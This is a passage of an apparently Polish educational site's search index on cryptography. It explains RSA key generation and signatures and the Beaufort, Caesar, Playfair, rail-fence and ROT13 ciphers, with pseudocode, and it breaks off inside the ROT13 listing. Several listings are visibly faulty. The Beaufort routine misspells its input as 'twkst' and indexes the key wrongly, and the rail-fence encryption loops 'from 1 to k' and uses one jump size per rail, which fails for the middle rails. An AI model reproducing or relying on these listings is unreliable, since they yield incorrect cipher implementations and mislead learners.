zaimplementowana i stosowana, oferuje wysoki poziom bezpiecze\u0144stwa, to jak ka\u017cda technologia wymaga \u015bwiadomo\u015bci jej ogranicze\u0144 i potencjalnych zagro\u017ce\u0144.</p>"},{"location":"algorithms/cryptography/assymetric/#prezentacja","title":"Prezentacja","text":"<p>Poni\u017cej znajduje si\u0119 kr\u00f3tka prezentacja pokazuj\u0105ca istot\u0119 kryptografii asymetrycznej.</p> <p> Prezentacja</p>"},{"location":"algorithms/cryptography/assymetric/rsa/","title":"RSA","text":"<p>RSA, nazwane od nazwisk tw\u00f3rc\u00f3w (Rivest, Shamir i Adleman), jest jednym z pierwszych praktycznych algorytm\u00f3w kryptografii asymetrycznej i jest szeroko stosowany w wielu systemach zabezpiecze\u0144 do dzi\u015b. Algorytm ten pozwala na szyfrowanie danych oraz generowanie podpis\u00f3w cyfrowych.</p>"},{"location":"algorithms/cryptography/assymetric/rsa/#algorytm","title":"Algorytm","text":"<ol> <li>Generowanie kluczy:</li> <li>Wybierz dwie r\u00f3\u017cne liczby pierwsze \\(p\\) i \\(q\\).</li> <li>Oblicz \\(n = p \\times q\\) - b\u0119dzie to modu\u0142 dla kluczy publicznego i prywatnego.</li> <li>Oblicz funkcj\u0119 Eulera \\(\\phi(n) = (p-1) \\times (q-1)\\).</li> <li>Wybierz liczb\u0119 \\(e\\) tak\u0105, \u017ce \\(1 &lt; e &lt; \\phi(n)\\) i \\(\\text{NWD}(e, \\phi(n)) = 1\\). Liczba \\(e\\) jest kluczem publicznym.</li> <li> <p>Oblicz \\(d\\) jako odwrotno\u015b\u0107 \\(e\\) modulo \\(\\phi(n)\\). Liczba \\(d\\) jest kluczem prywatnym.</p> </li> <li> <p>Szyfrowanie:</p> </li> <li> <p>Dla wiadomo\u015bci \\(M\\), gdzie \\(0 \\leq M &lt; n\\), zaszyfrowana wiadomo\u015b\u0107 \\(C\\) jest dana jako \\(C = M^e \\mod n\\).</p> </li> <li> <p>Deszyfrowanie:</p> </li> <li>Aby uzyska\u0107 pierwotn\u0105 wiadomo\u015b\u0107 \\(M\\) z zaszyfrowanej wiadomo\u015bci \\(C\\), oblicz \\(M = C^d \\mod n\\).</li> </ol>"},{"location":"algorithms/cryptography/assymetric/rsa/#bezpieczenstwo","title":"Bezpiecze\u0144stwo","text":"<p>Bezpiecze\u0144stwo RSA opiera si\u0119 na trudno\u015bci faktoryzacji du\u017cych liczb ca\u0142kowitych. Dla dostatecznie du\u017cych liczb \\(n\\) i przy braku znajomo\u015bci \\(p\\) i \\(q\\), trudno jest obliczy\u0107 \\(\\phi(n)\\) i z tego powodu trudno jest obliczy\u0107 klucz prywatny \\(d\\) znaj\u0105c tylko klucz publiczny \\(e\\).</p>"},{"location":"algorithms/cryptography/assymetric/rsa/#podpisy-cyfrowe","title":"Podpisy cyfrowe","text":"<p>RSA mo\u017ce by\u0107 r\u00f3wnie\u017c u\u017cywane do generowania podpis\u00f3w cyfrowych.    - Generowanie podpisu: aby podpisa\u0107 wiadomo\u015b\u0107 \\(M\\), osoba posiadaj\u0105ca klucz prywatny \\(d\\) oblicza \\(S = M^d \\mod n\\), gdzie \\(S\\) jest podpisem.    - Weryfikacja podpisu: ka\u017cdy, kto ma klucz publiczny \\(e\\), mo\u017ce zweryfikowa\u0107 podpis obliczaj\u0105c \\(M = S^e \\mod n\\) i por\u00f3wnuj\u0105c go z pierwotn\u0105 wiadomo\u015bci\u0105.</p>"},{"location":"algorithms/cryptography/assymetric/rsa/#wnioski","title":"Wnioski","text":"<p>Algorytm RSA by\u0142 rewolucj\u0105 w dziedzinie kryptografii i odgrywa kluczow\u0105 rol\u0119 w wielu aspektach bezpiecze\u0144stwa cyfrowego. Jest u\u017cywany w protoko\u0142ach takich jak SSL/TLS, co umo\u017cliwia bezpieczn\u0105 komunikacj\u0119 w Internecie. Chocia\u017c istniej\u0105 bardziej zaawansowane metody kryptografii (np. kryptografia krzywych eliptycznych), RSA wci\u0105\u017c pozostaje jednym z najwa\u017cniejszych i najcz\u0119\u015bciej stosowanych algorytm\u00f3w w dziedzinie kryptografii. Jednak wa\u017cne jest stosowanie odpowiednio d\u0142ugich kluczy (np. 2048-bitowych lub d\u0142u\u017cszych) w celu zapewnienia odpowiedniego poziomu bezpiecze\u0144stwa.</p>"},{"location":"algorithms/cryptography/symmetric/","title":"Metody szyfrowania symetrycznego","text":""},{"location":"algorithms/cryptography/symmetric/#szyfry-podstawieniowe","title":"Szyfry podstawieniowe","text":"<p>W szyfrach podstawieniowych szyfrogram powstaje poprzez zast\u0105pienie ka\u017cdej litery tekstu jawnego innym, ustalonym wcze\u015bniej znakiem.</p>"},{"location":"algorithms/cryptography/symmetric/#podzia","title":"Podzia\u0142","text":"<ul> <li>Szyfry monoalfabetyczne - ka\u017cdemu znakowi alfabetu jawnego przyporz\u0105dkowywany jest jeden znak alfabetu tajnego.</li> <li>Szyfry homofoniczne - ka\u017cdemu znakowi alfabetu jawnego przyporz\u0105dkowywana jest grupa znak\u00f3w alfabetu tajnego.</li> <li>Szyfry polialfabetyczne - u\u017cywanych jest wiele alfabet\u00f3w tajnych, kt\u00f3re s\u0142u\u017c\u0105 do szyfrowania poszczeg\u00f3lnych znak\u00f3w tekstu jawnego.</li> <li>Szyfry poligramowe - szyfrowane s\u0105 grupy znak\u00f3w.</li> </ul>"},{"location":"algorithms/cryptography/symmetric/#wybrane-szyfry","title":"Wybrane szyfry","text":"<p>Szyfr Cezara</p> <p>Szyfr Rot13</p> <p>Szyfr Trithemiusa</p> <p>Szyfr Beauforta</p> <p>Szyfr Vigenere'a</p>"},{"location":"algorithms/cryptography/symmetric/#szyfry-przestawieniowe","title":"Szyfry przestawieniowe","text":"<p>W szyfrach przestawieniowych szyfrogram jest tworzony poprzez przestawienie kolejno\u015bci znak\u00f3w w tek\u015bcie jawnym, jednak same znaki nie s\u0105 zmieniane.</p>"},{"location":"algorithms/cryptography/symmetric/#wybrane-szyfry_1","title":"Wybrane szyfry","text":"<p>Szyfr Playfair</p> <p>Szyfr P\u0142otkowy</p>"},{"location":"algorithms/cryptography/symmetric/#szyfry-mieszane","title":"Szyfry mieszane","text":"<p>Szyfry mieszane stanowi\u0105 po\u0142\u0105czenie szyfru podstawieniowego z szyfrem przestawieniowym.</p>"},{"location":"algorithms/cryptography/symmetric/#prezentacja","title":"Prezentacja","text":"<p> Prezentacja</p>"},{"location":"algorithms/cryptography/symmetric/beaufort/","title":"Szyfr Beauforta","text":"<p>Szyfr Beauforta, nazwany na cze\u015b\u0107 Sir Francisa Beauforta, jest odmian\u0105 szyfru Vigen\u00e8re'a, w kt\u00f3rym operacja szyfrowania i deszyfrowania jest zamieniona. Podobnie jak w przypadku Vigen\u00e8re'a, jest to technika szyfrowania substytucyjnego wieloalfabetycznego.</p>"},{"location":"algorithms/cryptography/symmetric/beaufort/#opis-dziaania","title":"Opis dzia\u0142ania","text":"<ol> <li> <p>Klucz: wybierz klucz (s\u0142owo lub fraza), kt\u00f3ry b\u0119dzie u\u017cywany do szyfrowania i deszyfrowania wiadomo\u015bci.</p> </li> <li> <p>Szyfrowanie:</p> </li> <li>Rozszerz klucz do d\u0142ugo\u015bci oryginalnej wiadomo\u015bci.</li> <li> <p>Dla ka\u017cdej litery wiadomo\u015bci:</p> <ul> <li>Znajd\u017a indeks litery klucza w alfabecie.</li> <li>Odejmij ten indeks od indeksu litery oryginalnej wiadomo\u015bci (zamiast dodawania, jak w Vigen\u00e8re).</li> <li>Je\u015bli wynik jest ujemny, dodaj d\u0142ugo\u015b\u0107 alfabetu.</li> <li>Znajd\u017a liter\u0119 odpowiadaj\u0105c\u0105 wynikowi - jest to zaszyfrowana litera.</li> </ul> </li> <li> <p>Deszyfrowanie: proces deszyfrowania jest identyczny z procesem szyfrowania w szyfrze Beauforta, poniewa\u017c jest to odwrotna operacja Vigen\u00e8re'a.</p> </li> </ol>"},{"location":"algorithms/cryptography/symmetric/beaufort/#przykad","title":"Przyk\u0142ad","text":"<p>Za\u0142\u00f3\u017cmy, \u017ce mamy wiadomo\u015b\u0107 \"HELLO\" i klucz \"KEY\". Pierwszym krokiem jest rozszerzenie klucza do \"KEYKE\". Teraz ka\u017cda litera wiadomo\u015bci jest \"odejmowana\" od litery klucza, aby uzyska\u0107 zaszyfrowan\u0105 wiadomo\u015b\u0107.</p>"},{"location":"algorithms/cryptography/symmetric/beaufort/#bezpieczenstwo","title":"Bezpiecze\u0144stwo","text":"<p>Podobnie jak szyfr Vigen\u00e8re'a, szyfr Beauforta mo\u017ce by\u0107 \u0142amany przy u\u017cyciu technik kryptoanalizy, takich jak analiza cz\u0119stotliwo\u015bci liter w tek\u015bcie. Szyfr ten by\u0142by trudniejszy do z\u0142amania w czasach przed komputerami, ale dzisiaj istniej\u0105 skuteczne metody ataku na t\u0119 metod\u0119 szyfrowania. </p>"},{"location":"algorithms/cryptography/symmetric/beaufort/#specyfikacja","title":"Specyfikacja","text":""},{"location":"algorithms/cryptography/symmetric/beaufort/#dane","title":"Dane","text":"<ul> <li>tekst - tekst do zaszyfrowania/odszyfrowania, sk\u0142adaj\u0105cy si\u0119 z ma\u0142ych liter alfabetu angielskiego</li> <li>klucz - ci\u0105g znak\u00f3w sk\u0142adaj\u0105cy si\u0119 z ma\u0142ych liter alfabetu angielskiego</li> </ul>"},{"location":"algorithms/cryptography/symmetric/beaufort/#wynik","title":"Wynik","text":"<ul> <li>Zaszyfrowany/odszyfrowany tekst.</li> </ul>"},{"location":"algorithms/cryptography/symmetric/beaufort/#szyfrowanie-i-deszyfrowanie","title":"Szyfrowanie i deszyfrowanie","text":""},{"location":"algorithms/cryptography/symmetric/beaufort/#funkcje-pomocnicze","title":"Funkcje pomocnicze","text":"<ul> <li>Pozycja(litera) - zwraca liczb\u0119 od \\(1\\) do \\(26\\) - pozycj\u0119 przekazanej jako argument litery w alfabecie angielskim</li> <li>Alfabet(pozycja) - zwraca liter\u0119 na zadanej pozycji w alfabecie angielskim</li> <li>D\u0142ugo\u015b\u0107(tekst) - zwraca d\u0142ugo\u015b\u0107 tekstu</li> </ul>"},{"location":"algorithms/cryptography/symmetric/beaufort/#pseudokod","title":"Pseudokod","text":"<pre><code>funkcja Beaufort(tekst, klucz):\n    1. wynik := \"\"\n    2. kluczIndeks := 1\n    3. Dla i := 1 do D\u0142ugo\u015b\u0107(twkst), wykonuj:\n        4. nowaPozycja := 27 - Pozycja(twkst[i]) + Pozycja[kluczIndeks]\n        5. Je\u017celi nowaPozycja &gt; 26, to:\n            6. nowaPozycja := nowaPozycja - 26\n        7. nowaLitera := Alfabet(nowaPozycja)\n        8. wynik := wynik + nowaLitera\n        9. kluczIndeks := kluczIndeks + 1\n        10. Je\u017celi kluczIndeks &gt; D\u0142ugo\u015b\u0107(klucz), to:\n            11. kluczIndeks := kluczIndeks - D\u0142ugo\u015b\u0107(klucz)\n\n    12. Zwr\u00f3\u0107 wynik \n</code></pre>"},{"location":"algorithms/cryptography/symmetric/beaufort/#implementacja","title":"Implementacja","text":""},{"location":"algorithms/cryptography/symmetric/beaufort/#c","title":"C++","text":""},{"location":"algorithms/cryptography/symmetric/beaufort/#python","title":"Python","text":""},{"location":"algorithms/cryptography/symmetric/caesar/","title":"Szyfr Cezara","text":"<p>Szyfr Cezara to jedna z najstarszych znanych technik szyfrowania. Zosta\u0142 nazwany na cze\u015b\u0107 Juliusza Cezara, kt\u00f3ry rzekomo u\u017cywa\u0142 go do szyfrowania swojej prywatnej korespondencji.</p>"},{"location":"algorithms/cryptography/symmetric/caesar/#opis-dziaania","title":"Opis dzia\u0142ania","text":"<ol> <li> <p>Przesuni\u0119cie: wybierz liczb\u0119, zwan\u0105 przesuni\u0119ciem (np. 3). Ta liczba okre\u015bla, o ile miejsc w alfabecie litery b\u0119d\u0105 przesuwane.</p> </li> <li> <p>Szyfrowanie:</p> </li> <li> <p>Dla ka\u017cdej litery w tek\u015bcie jawnym:</p> <ul> <li>Znajd\u017a jej po\u0142o\u017cenie w alfabecie.</li> <li>Dodaj do niego warto\u015b\u0107 przesuni\u0119cia.</li> <li>Je\u015bli wynik przekroczy d\u0142ugo\u015b\u0107 alfabetu, zacznij od pocz\u0105tku (np. dla alfabetu \u0142aci\u0144skiego \"z\" przesuni\u0119te o 1 staje si\u0119 \"a\").</li> <li>Zast\u0105p liter\u0119 tekstu jawnego liter\u0105 z nowym po\u0142o\u017ceniem.</li> </ul> </li> <li> <p>Deszyfrowanie: proces ten jest odwrotny do szyfrowania. Zamiast dodawa\u0107 warto\u015b\u0107 przesuni\u0119cia, odejmuje si\u0119 j\u0105 od ka\u017cdej litery w tek\u015bcie zaszyfrowanym.</p> </li> </ol>"},{"location":"algorithms/cryptography/symmetric/caesar/#przykad","title":"Przyk\u0142ad","text":"<p>Za\u0142\u00f3\u017cmy, \u017ce mamy wiadomo\u015b\u0107 \"ABC\" i przesuni\u0119cie 3. Po zastosowaniu szyfru Cezara wiadomo\u015b\u0107 staje si\u0119 \"DEF\".</p>"},{"location":"algorithms/cryptography/symmetric/caesar/#bezpieczenstwo","title":"Bezpiecze\u0144stwo","text":"<p>Szyfr Cezara jest bardzo prosty i \u0142atwo jest go z\u0142ama\u0107, nawet bez znajomo\u015bci klucza. Wystarczy przetestowa\u0107 wszystkie 25 mo\u017cliwych przesuni\u0119\u0107 (dla standardowego alfabetu \u0142aci\u0144skiego) lub u\u017cy\u0107 analizy cz\u0119stotliwo\u015bci liter. Dlatego szyfr Cezara jest uwa\u017cany za niebezpieczny i nieodpowiedni dla wi\u0119kszo\u015bci zastosowa\u0144 w dzisiejszych czasach.</p>"},{"location":"algorithms/cryptography/symmetric/caesar/#specyfikacja","title":"Specyfikacja","text":""},{"location":"algorithms/cryptography/symmetric/caesar/#dane","title":"Dane","text":"<ul> <li>jawny/szyfrogram - tekst do zaszyfrowania/odszyfrowania, sk\u0142adaj\u0105cy si\u0119 z ma\u0142ych liter alfabetu angielskiego</li> <li>klucz - liczba naturalna z zakresu \\(&lt;0,25&gt;\\)</li> </ul>"},{"location":"algorithms/cryptography/symmetric/caesar/#wynik","title":"Wynik","text":"<ul> <li>Zaszyfrowany/odszyfrowany tekst.</li> </ul>"},{"location":"algorithms/cryptography/symmetric/caesar/#szyfrowanie","title":"Szyfrowanie","text":""},{"location":"algorithms/cryptography/symmetric/caesar/#funkcje-pomocnicze","title":"Funkcje pomocnicze","text":"<ul> <li>Pozycja(litera) - zwraca liczb\u0119 od \\(1\\) do \\(26\\) - pozycj\u0119 przekazanej jako argument litery w alfabecie angielskim</li> <li>Alfabet(pozycja) - zwraca liter\u0119 na zadanej pozycji w alfabecie angielskim</li> <li>D\u0142ugo\u015b\u0107(tekst) - zwraca d\u0142ugo\u015b\u0107 tekstu</li> </ul>"},{"location":"algorithms/cryptography/symmetric/caesar/#pseudokod","title":"Pseudokod","text":"<pre><code>funkcja SzyfrujCezar(jawny, klucz):\n    1. szyfrogram := \"\"\n    2. Dla i := 1 do D\u0142ugo\u015b\u0107(jawny), wykonuj:\n        3. nowaPozycja := Pozycja(jawny[i]) + klucz\n        4. Je\u017celi nowaPozycja &gt; 26, to:\n            5. nowaPozycja := nowaPozycja - 26\n        6. nowaLitera := Alfabet(nowaPozycja)\n        7. szyfrogram := szyfrogram + nowaLitera\n\n    8. Zwr\u00f3\u0107 szyfrogram \n</code></pre>"},{"location":"algorithms/cryptography/symmetric/caesar/#deszyfrowanie","title":"Deszyfrowanie","text":""},{"location":"algorithms/cryptography/symmetric/caesar/#funkcje-pomocnicze_1","title":"Funkcje pomocnicze","text":"<ul> <li>Pozycja(litera) - zwraca liczb\u0119 od \\(1\\) do \\(26\\) - pozycj\u0119 przekazanej jako argument litery w alfabecie angielskim</li> <li>Alfabet(pozycja) - zwraca liter\u0119 na zadanej pozycji w alfabecie angielskim</li> <li>D\u0142ugo\u015b\u0107(tekst) - zwraca d\u0142ugo\u015b\u0107 tekstu</li> </ul>"},{"location":"algorithms/cryptography/symmetric/caesar/#pseudokod_1","title":"Pseudokod","text":"<pre><code>funkcja DeszyfrujCezar(szyfrogram, klucz):\n    1. jawny := \"\"\n    2. Dla i := 1 do D\u0142ugo\u015b\u0107(szyfrogram), wykonuj:\n        3. nowaPozycja := Pozycja(szyfrogram[i]) - klucz\n        4. Je\u017celi nowaPozycja &lt; 1, to:\n            5. nowaPozycja := 26 + nowaPozycja\n        6. nowaLitera := Alfabet(nowaPozycja)\n        7. jawny := jawny + nowaLitera\n\n    8. Zwr\u00f3\u0107 jawny \n</code></pre>"},{"location":"algorithms/cryptography/symmetric/caesar/#implementacja","title":"Implementacja","text":""},{"location":"algorithms/cryptography/symmetric/caesar/#c","title":"C++","text":""},{"location":"algorithms/cryptography/symmetric/caesar/#python","title":"Python","text":""},{"location":"algorithms/cryptography/symmetric/playfair/","title":"Szyfr Playfaira","text":"<p>Szyfr Playfair, wynaleziony w 1854 roku przez Charlesa Wheatstone\u2019a i promowany przez lorda Playfaira, jest technik\u0105 szyfrowania digraf\u00f3w (par liter). To jeden z pierwszych pr\u00f3b stworzenia bardziej skomplikowanego szyfru ni\u017c tradycyjne szyfry monoalfabetyczne.</p>"},{"location":"algorithms/cryptography/symmetric/playfair/#opis-dziaania","title":"Opis dzia\u0142ania","text":"<ol> <li> <p>Klucz: wybierz fraz\u0119 kluczow\u0105 (np. \"KRYPTOGRAFIA\"). Usu\u0144 z niej powtarzaj\u0105ce si\u0119 litery i wype\u0142nij reszt\u0119 literami alfabetu (w wi\u0119kszo\u015bci implementacji litery \"I\" i \"J\" s\u0105 traktowane jako jedno). </p> </li> <li> <p>Macierz 5x5: utw\u00f3rz macierz \\(5\\times5\\) i wype\u0142nij j\u0105 literami uzyskanymi w poprzednim kroku.</p> </li> <li> <p>Szyfrowanie:</p> </li> <li>Tekst jawny dzieli si\u0119 na pary liter. Je\u015bli litera w parze si\u0119 powtarza lub jest nieparzysta liczba liter, dodaj \"X\" lub inn\u0105 liter\u0119 dla wyr\u00f3wnania.</li> <li> <p>Dla ka\u017cdej pary:</p> <ul> <li>Je\u015bli obie litery znajduj\u0105 si\u0119 w tym samym wierszu, zast\u0105p je literami po prawej stronie (lub z lewej, je\u015bli s\u0105 na ko\u0144cu).</li> <li>Je\u015bli obie litery znajduj\u0105 si\u0119 w tej samej kolumnie, zast\u0105p je literami poni\u017cej (lub powy\u017cej, je\u015bli s\u0105 na dole).</li> <li>W przeciwnym razie zast\u0105p je literami z ich w\u0142asnego wiersza, ale kolumny drugiej litery.</li> </ul> </li> <li> <p>Deszyfrowanie: proces ten jest odwrotny do szyfrowania, z wyj\u0105tkiem tego, \u017ce litery s\u0105 przesuwane w lewo lub w g\u00f3r\u0119, zamiast w prawo lub w d\u00f3\u0142.</p> </li> </ol>"},{"location":"algorithms/cryptography/symmetric/playfair/#przykad","title":"Przyk\u0142ad","text":"<p>Za\u0142\u00f3\u017cmy, \u017ce mamy klucz \"KRYPTOGRAFIA\" i wiadomo\u015b\u0107 \"TEKST\". Po utworzeniu macierzy i podzieleniu tekstu na pary (\"TE\", \"KS\", \"TX\"), szyfrowanie przebiega wed\u0142ug zasad wymienionych powy\u017cej.</p>"},{"location":"algorithms/cryptography/symmetric/playfair/#bezpieczenstwo","title":"Bezpiecze\u0144stwo","text":"<p>Szyfr Playfair jest bardziej bezpieczny ni\u017c szyfry monoalfabetyczne, poniewa\u017c uwzgl\u0119dnia pary liter, co sprawia, \u017ce analiza cz\u0119stotliwo\u015bci jest trudniejsza. Niemniej jednak, ze wzgl\u0119du na jego deterministyczn\u0105 natur\u0119, jest podatny na bardziej zaawansowane metody kryptoanalizy i nie jest odpowiedni dla nowoczesnych zastosowa\u0144..</p>"},{"location":"algorithms/cryptography/symmetric/playfair/#specyfikacja","title":"Specyfikacja","text":""},{"location":"algorithms/cryptography/symmetric/playfair/#dane","title":"Dane","text":"<ul> <li>jawny/szyfrogram - tekst do zaszyfrowania/odszyfrowania, sk\u0142adaj\u0105cy si\u0119 z ma\u0142ych liter alfabetu angielskiego</li> <li>klucz - ci\u0105g znak\u00f3w sk\u0142adaj\u0105cy si\u0119 z ma\u0142ych liter alfabetu angielskiego</li> </ul>"},{"location":"algorithms/cryptography/symmetric/playfair/#wynik","title":"Wynik","text":"<ul> <li>Zaszyfrowany/odszyfrowany tekst.</li> </ul>"},{"location":"algorithms/cryptography/symmetric/playfair/#implementacja","title":"Implementacja","text":""},{"location":"algorithms/cryptography/symmetric/playfair/#c","title":"C++","text":""},{"location":"algorithms/cryptography/symmetric/playfair/#python","title":"Python","text":""},{"location":"algorithms/cryptography/symmetric/rail-fence/","title":"Szyfr p\u0142otkowy","text":"<p>Szyfr p\u0142otkowy, cz\u0119sto nazywany r\u00f3wnie\u017c szyfrem \u017caglowym, jest technik\u0105 transpozycji, gdzie litery tekstu jawnego s\u0105 pisane na skos w d\u00f3\u0142 i wzd\u0142u\u017c, a potem odczytywane linia po linii. Daje to efekt, jakby litery by\u0142y zawieszone na pewnego rodzaju \"p\u0142otku\".</p>"},{"location":"algorithms/cryptography/symmetric/rail-fence/#opis-dziaania","title":"Opis dzia\u0142ania","text":"<ol> <li> <p>Ustal g\u0142\u0119boko\u015b\u0107 p\u0142otka: wybierz liczb\u0119, kt\u00f3ra b\u0119dzie g\u0142\u0119boko\u015bci\u0105 p\u0142otka (np. 3).</p> </li> <li> <p>Zapisanie tekstu: pisz tekst jawny na skos w d\u00f3\u0142 do osi\u0105gni\u0119cia wybranej g\u0142\u0119boko\u015bci, a nast\u0119pnie zmie\u0144 kierunek i pisz w g\u00f3r\u0119, a\u017c dojdziesz do g\u00f3rnej kraw\u0119dzi. Kontynuuj t\u0119 metod\u0119 przez ca\u0142y tekst.</p> </li> <li> <p>Odczytanie zaszyfrowanej wiadomo\u015bci: aby otrzyma\u0107 tekst zaszyfrowany, odczytaj ka\u017cdy rz\u0105d liter od g\u00f3ry do do\u0142u.</p> </li> </ol>"},{"location":"algorithms/cryptography/symmetric/rail-fence/#bezpieczenstwo","title":"Bezpiecze\u0144stwo","text":"<p>Szyfr p\u0142otkowy jest stosunkowo prosty do deszyfrowania, zw\u0142aszcza je\u015bli przeciwnik zna lub mo\u017ce odgadn\u0105\u0107 g\u0142\u0119boko\u015b\u0107 p\u0142otka. Podobnie jak inne metody transpozycji, nie zmienia on cz\u0119stotliwo\u015bci liter, co sprawia, \u017ce jest podatny na analiz\u0119 statystyczn\u0105.</p>"},{"location":"algorithms/cryptography/symmetric/rail-fence/#specyfikacja","title":"Specyfikacja","text":""},{"location":"algorithms/cryptography/symmetric/rail-fence/#dane","title":"Dane","text":"<ul> <li>jawny/szyfrogram - tekst do zaszyfrowania/odszyfrowania, sk\u0142adaj\u0105cy si\u0119 z ma\u0142ych liter alfabetu angielskiego</li> <li>klucz - liczba naturalna, wi\u0119ksza od zera</li> </ul>"},{"location":"algorithms/cryptography/symmetric/rail-fence/#wynik","title":"Wynik","text":"<ul> <li>Zaszyfrowany/odszyfrowany tekst.</li> </ul>"},{"location":"algorithms/cryptography/symmetric/rail-fence/#przykad-1","title":"Przyk\u0142ad 1","text":"<p>Tekst jawny: ALAMAKOTA.</p> <p>Klucz: \\(3\\)</p> <pre><code>  A   O\n L M K T\nA   A   A\n</code></pre> <p>Szyfrogram: AOLMKTAAA</p>"},{"location":"algorithms/cryptography/symmetric/rail-fence/#przykad-2","title":"Przyk\u0142ad 2","text":"<p>Tekst jawny: ALAMAKOTA.</p> <p>Klucz: \\(4\\)</p> <pre><code>   M\n  A A    A\n L   K  T\nA     O\n</code></pre> <p>Szyfrogram: MAAALKTAO</p>"},{"location":"algorithms/cryptography/symmetric/rail-fence/#szyfrowanie","title":"Szyfrowanie","text":""},{"location":"algorithms/cryptography/symmetric/rail-fence/#funkcje-pomocnicze","title":"Funkcje pomocnicze","text":"<ul> <li>D\u0142ugo\u015b\u0107(tekst) - zwraca d\u0142ugo\u015b\u0107 tekstu</li> </ul>"},{"location":"algorithms/cryptography/symmetric/rail-fence/#pseudokod","title":"Pseudokod","text":"<pre><code>funckja SzyfrujP\u0142otkowy(jawny, klucz):\n    1. szyfrogram := \"\"\n    2. Dla k := 1 do k, wykonuj:\n        3. Je\u017celi k = klucz, to:\n            4. skok := klucz * 2\n        5. w przeciwnym przypadku:\n            6. skok = (klucz - k) * 2\n        7. i := k\n        8. Dop\u00f3ki i &lt;= D\u0142ugo\u015b\u0107(jawny), wykonuj:\n            9. szyfrogram := szyfrogram + jawny[i]\n            10. i := i + skok\n\n    11. Zwr\u00f3\u0107 szyfrogram\n</code></pre>"},{"location":"algorithms/cryptography/symmetric/rail-fence/#deszyfrowanie","title":"Deszyfrowanie","text":""},{"location":"algorithms/cryptography/symmetric/rail-fence/#funkcje-pomocnicze_1","title":"Funkcje pomocnicze","text":"<ul> <li>D\u0142ugo\u015b\u0107(tekst) - zwraca d\u0142ugo\u015b\u0107 tekstu</li> </ul>"},{"location":"algorithms/cryptography/symmetric/rail-fence/#pseudokod_1","title":"Pseudokod","text":"<pre><code>funkcja DeszyfrujP\u0142otkowy(szyfrogram, klucz):\n    1. jawny := szyfrogram\n    2. j := 0\n    3. Dla k := 1 do klucz, wykonuj:\n        4. Je\u017celi k = klucz, to:\n            5. skok := klucz * 2\n        6. w przeciwnym przypadku:\n            7. skok := (klucz - k) * 2\n        7. i := k\n        8. Dop\u00f3ki i &lt; D\u0142ugo\u015b\u0107(szyfrogram), wykonuj:\n            9. jawny[i] := szyfrogram[j]\n            10. j := j + 1\n            11. i := i + skok\n\n    12. Zwr\u00f3\u0107 jawny\n</code></pre>"},{"location":"algorithms/cryptography/symmetric/rail-fence/#implementacja","title":"Implementacja","text":""},{"location":"algorithms/cryptography/symmetric/rail-fence/#c","title":"C++","text":""},{"location":"algorithms/cryptography/symmetric/rail-fence/#python","title":"Python","text":""},{"location":"algorithms/cryptography/symmetric/rot13/","title":"Szyfr ROT13","text":"<p>ROT13 (od ang. rotate by 13 places) to specjalny przypadek szyfru Cezara, w kt\u00f3rym przesuni\u0119cie wynosi 13 miejsc. Jest to technika u\u017cywana g\u0142\u00f3wnie do ukrywania tekstu, a nie dla rzeczywistych zastosowa\u0144 kryptograficznych, ze wzgl\u0119du na jej przewidywalno\u015b\u0107.</p>"},{"location":"algorithms/cryptography/symmetric/rot13/#opis-dziaania","title":"Opis dzia\u0142ania","text":"<ol> <li> <p>Podstawowa zasada: ka\u017cda litera w alfabecie jest przesuwana o 13 miejsc. Dla alfabetu \u0142aci\u0144skiego oznacza to, \u017ce litery od A do M s\u0105 przesuwane do liter od N do Z, a litery od N do Z s\u0105 przesuwane do liter od A do M.</p> </li> <li> <p>Przyk\u0142ad:</p> </li> <li>A staje si\u0119 N</li> <li>B staje si\u0119 O</li> <li>C staje si\u0119 P</li> <li>...</li> <li> <p>Z staje si\u0119 M</p> </li> <li> <p>Rekursywno\u015b\u0107: jednym z ciekawych aspekt\u00f3w ROT13 jest to, \u017ce dwukrotne zastosowanie algorytmu przynosi tekst jawny. Oznacza to, \u017ce ROT13 jest zar\u00f3wno metod\u0105 szyfrowania, jak i deszyfrowania.</p> </li> </ol>"},{"location":"algorithms/cryptography/symmetric/rot13/#przykad","title":"Przyk\u0142ad","text":"<p>Za\u0142\u00f3\u017cmy, \u017ce chcemy zaszyfrowa\u0107 tekst \"ALGORYTM\". Po zastosowaniu ROT13 otrzymujemy: \"NYTBEGLZ\".</p> <p>Gdyby\u015bmy teraz zaszyfrowali \"NYTBEGLZ\" za pomoc\u0105 ROT13, wr\u00f3ciliby\u015bmy do oryginalnego tekstu \"ALGORYTM\".</p>"},{"location":"algorithms/cryptography/symmetric/rot13/#bezpieczenstwo","title":"Bezpiecze\u0144stwo","text":"<p>ROT13 nie jest bezpiecznym sposobem szyfrowania informacji. Jest \u0142atwo rozpoznawalny i \u0142atwo deszyfrowalny, nawet bez znajomo\u015bci metody. W praktyce jest cz\u0119sto u\u017cywany do ukrywania spoiler\u00f3w w dyskusjach online lub do lekkiego zaciemnienia tekstu, ale nie powinien by\u0107 u\u017cywany w sytuacjach, gdzie bezpiecze\u0144stwo jest wa\u017cne.</p>"},{"location":"algorithms/cryptography/symmetric/rot13/#specyfikacja","title":"Specyfikacja","text":""},{"location":"algorithms/cryptography/symmetric/rot13/#dane","title":"Dane","text":"<ul> <li>jawny/szyfrogram - tekst do zaszyfrowania/odszyfrowania, sk\u0142adaj\u0105cy si\u0119 z ma\u0142ych liter alfabetu angielskiego</li> </ul>"},{"location":"algorithms/cryptography/symmetric/rot13/#wynik","title":"Wynik","text":"<ul> <li>Zaszyfrowany/odszyfrowany tekst.</li> </ul>"},{"location":"algorithms/cryptography/symmetric/rot13/#szyfrowanie-i-deszyfrowanie","title":"Szyfrowanie i deszyfrowanie","text":""},{"location":"algorithms/cryptography/symmetric/rot13/#funkcje-pomocnicze","title":"Funkcje pomocnicze","text":"<ul> <li>Pozycja(litera) - zwraca liczb\u0119 od \\(1\\) do \\(26\\) - pozycj\u0119 przekazanej jako argument litery w alfabecie angielskim</li> <li>Alfabet(pozycja) - zwraca liter\u0119 na zadanej pozycji w alfabecie angielskim</li> <li>D\u0142ugo\u015b\u0107(tekst) - zwraca d\u0142ugo\u015b\u0107 tekstu</li> </ul>"},{"location":"algorithms/cryptography/symmetric/rot13/#pseudokod","title":"Pseudokod","text":"<pre><code>funkcja Rot13(tekst):\n    1. wynik := \"\"\n    2. Dla i := 1 do D\u0142ugo\u015b\u0107(tekst), wykonuj:\n        3. nowaPozycja := Pozycja(tekst[i]) + 13\n        4. Je\u017celi nowaPozycja &gt; 26, to:\n            5. nowaPozycja := nowaPozycja - 26\n        6. nowaLitera := Alfabet(nowaPozycja)\n        7. wynik := wynik + nowaLitera\n\n    8. 